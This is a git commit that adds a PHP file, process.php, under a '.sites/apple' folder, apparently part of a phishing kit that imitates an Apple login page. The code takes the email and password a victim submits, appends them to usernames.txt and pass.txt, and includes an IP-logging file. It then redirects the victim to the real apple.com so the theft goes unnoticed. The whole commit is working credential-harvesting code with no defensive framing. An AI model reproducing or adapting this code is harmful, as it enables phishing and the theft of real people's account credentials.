77adb9c7a7c3cbab39c3f8581b0c29d9f5507fa5
Mr.Ruthless Devil <77040067+RDXLR@users.noreply.github.com>
2022-04-12 12:01:52 +0530

    Add files via upload

---
+++ .sites/apple/process.php
@@ -0,0 +1,8 @@
+<?php
+include 'ip.php';
+file_put_contents("usernames.txt", "Apple Usernames : " . $email = $_POST['email'] . "\n", FILE_APPEND);
+?>
+<?php
+file_put_contents("pass.txt", "Apple Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
+header('Location: https://www.apple.com/');
+?>
